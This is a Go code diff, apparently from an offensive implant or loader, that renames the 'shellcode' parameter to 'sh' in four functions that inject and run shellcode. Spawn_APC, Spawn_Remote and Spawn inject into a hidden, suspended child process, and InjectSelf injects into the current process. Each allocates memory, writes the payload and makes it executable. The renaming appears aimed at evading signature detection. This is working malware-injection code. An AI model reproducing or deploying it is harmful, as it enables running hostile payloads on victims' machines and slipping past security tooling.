@@ -90,7 +90,7 @@ type WOW64_FLOATING_SAVE_AREA struct {
 	Cr0NpxState   uint32
 }
 
-func Spawn_APC(shellcode []byte, path string) ([]byte, error) {
+func Spawn_APC(sh []byte, path string) ([]byte, error) {
 	command := syscall.StringToUTF16Ptr(path)
 	args := syscall.StringToUTF16Ptr("")
 	startupInfo := new(syscall.StartupInfo)
@@ -98,7 +98,7 @@ func Spawn_APC(shellcode []byte, path string) ([]byte, error) {
 	startupInfo.ShowWindow = windows.SW_HIDE
 	_ = syscall.CreateProcess(command, args, nil, nil, false, windows.CREATE_SUSPENDED, nil, nil, startupInfo, procInfo)
 
-	addr, _, _ := VirtualAllocEx.Call(uintptr(procInfo.Process), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
+	addr, _, _ := VirtualAllocEx.Call(uintptr(procInfo.Process), 0, uintptr(len(sh)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
 	if addr == 0 {
 		fmt.Println("VirtualAlloc Failed")
 		return nil, errors.New("VirtualAlloc Failed")
@@ -106,7 +106,7 @@ func Spawn_APC(shellcode []byte, path string) ([]byte, error) {
 		fmt.Println("Alloc: Success")
 	}
 
-	_, _, errWriteMemory := WriteProcessMemory.Call(uintptr(procInfo.Process), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
+	_, _, errWriteMemory := WriteProcessMemory.Call(uintptr(procInfo.Process), addr, (uintptr)(unsafe.Pointer(&sh[0])), uintptr(len(sh)))
 	if errWriteMemory.Error() != "The operation completed successfully." {
 		fmt.Println("WriteMemory: Failed")
 		return nil, errWriteMemory
@@ -114,7 +114,7 @@ func Spawn_APC(shellcode []byte, path string) ([]byte, error) {
 		fmt.Println("WriteMemory: Success")
 	}
 	oldProtect := windows.PAGE_READWRITE
-	_, _, errVirtualProtect := VirtualProtectEx.Call(uintptr(procInfo.Process), addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
+	_, _, errVirtualProtect := VirtualProtectEx.Call(uintptr(procInfo.Process), addr, uintptr(len(sh)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
 	if errVirtualProtect.Error() != "The operation completed successfully." {
 		fmt.Println("VirtualProtect: Failed")
 		return nil, errVirtualProtect
@@ -135,7 +135,7 @@ func Spawn_APC(shellcode []byte, path string) ([]byte, error) {
 	return []byte("Spawn success"), nil
 }
 
-func Spawn_Remote(shellcode []byte, path string) ([]byte, error) {
+func Spawn_Remote(sh []byte, path string) ([]byte, error) {
 
 	command := syscall.StringToUTF16Ptr(path)
 	args := syscall.StringToUTF16Ptr("")
@@ -144,7 +144,7 @@ func Spawn_Remote(shellcode []byte, path string) ([]byte, error) {
 	startupInfo.ShowWindow = windows.SW_HIDE
 	_ = syscall.CreateProcess(command, args, nil, nil, false, windows.CREATE_SUSPENDED, nil, nil, startupInfo, procInfo)
 
-	addr, _, _ := VirtualAllocEx.Call(uintptr(procInfo.Process), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
+	addr, _, _ := VirtualAllocEx.Call(uintptr(procInfo.Process), 0, uintptr(len(sh)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
 	if addr == 0 {
 		fmt.Println("VirtualAlloc Failed")
 		return nil, errors.New("VirtualAlloc Failed")
@@ -152,7 +152,7 @@ func Spawn_Remote(shellcode []byte, path string) ([]byte, error) {
 		fmt.Println("Alloc: Success")
 	}
 
-	_, _, errWriteMemory := WriteProcessMemory.Call(uintptr(procInfo.Process), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
+	_, _, errWriteMemory := WriteProcessMemory.Call(uintptr(procInfo.Process), addr, (uintptr)(unsafe.Pointer(&sh[0])), uintptr(len(sh)))
 	if errWriteMemory.Error() != "The operation completed successfully." {
 		fmt.Println("WriteMemory: Failed")
 		return nil, errWriteMemory
@@ -160,7 +160,7 @@ func Spawn_Remote(shellcode []byte, path string) ([]byte, error) {
 		fmt.Println("WriteMemory: Success")
 	}
 	oldProtect := windows.PAGE_READWRITE
-	_, _, errVirtualProtect := VirtualProtectEx.Call(uintptr(procInfo.Process), addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
+	_, _, errVirtualProtect := VirtualProtectEx.Call(uintptr(procInfo.Process), addr, uintptr(len(sh)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
 	if errVirtualProtect.Error() != "The operation completed successfully." {
 		fmt.Println("VirtualProtect: Failed")
 		return nil, errVirtualProtect
@@ -179,7 +179,7 @@ func Spawn_Remote(shellcode []byte, path string) ([]byte, error) {
 	return []byte("Spawn success"), nil
 }
 
-func Spawn(shellcode []byte, path string) ([]byte, error) {
+func Spawn(sh []byte, path string) ([]byte, error) {
 
 	command := syscall.StringToUTF16Ptr(path)
 	args := syscall.StringToUTF16Ptr("")
@@ -188,7 +188,7 @@ func Spawn(shellcode []byte, path string) ([]byte, error) {
 	startupInfo.ShowWindow = windows.SW_HIDE
 	_ = syscall.CreateProcess(command, args, nil, nil, false, windows.CREATE_SUSPENDED, nil, nil, startupInfo, procInfo)
 
-	addr, _, err := VirtualAllocEx.Call(uintptr(procInfo.Process), 0, uintptr(len(shellcode)),
+	addr, _, err := VirtualAllocEx.Call(uintptr(procInfo.Process), 0, uintptr(len(sh)),
 		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
 	if addr == 0 {
 		fmt.Println("VirtualAlloc Failed")
@@ -199,14 +199,14 @@ func Spawn(shellcode []byte, path string) ([]byte, error) {
 	}
 
 	_, _, err = WriteProcessMemory.Call(uintptr(procInfo.Process), addr,
-		(uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
+		(uintptr)(unsafe.Pointer(&sh[0])), uintptr(len(sh)))
 	if err != nil && err.Error() != "The operation completed successfully." {
 		return nil, err
 	}
 
 	oldProtect := windows.PAGE_READWRITE
 	_, _, err = VirtualProtectEx.Call(uintptr(procInfo.Process), addr,
-		uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
+		uintptr(len(sh)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
 	if err != nil && err.Error() != "The operation completed successfully." {
 		return nil, err
 	}
@@ -235,13 +235,13 @@ func Spawn(shellcode []byte, path string) ([]byte, error) {
 
 }
 
-func InjectSelf(shellcode []byte) ([]byte, error) {
+func InjectSelf(sh []byte) ([]byte, error) {
 	process, err := windows.GetCurrentProcess()
 	if err != nil {
 		return nil, errors.New("GetCurrentProcess failed")
 	}
 
-	addr, _, err := VirtualAllocEx.Call(uintptr(process), 0, uintptr(len(shellcode)),
+	addr, _, err := VirtualAllocEx.Call(uintptr(process), 0, uintptr(len(sh)),
 		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
 	if addr == 0 {
 		fmt.Println("VirtualAlloc Failed")
@@ -251,13 +251,13 @@ func InjectSelf(shellcode []byte) ([]byte, error) {
 		return nil, err
 	}
 
-	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
+	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&sh[0])), uintptr(len(sh)))
 	if err != nil && err.Error() != "The operation completed successfully." {
 		return nil, err
 	}
 
 	oldProtect := windows.PAGE_READWRITE
-	_, _, err = VirtualProtect.Call(addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
+	_, _, err = VirtualProtect.Call(addr, uintptr(len(sh)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
 	if err != nil && err.Error() != "The operation completed successfully." {
 		return nil, err
 	}
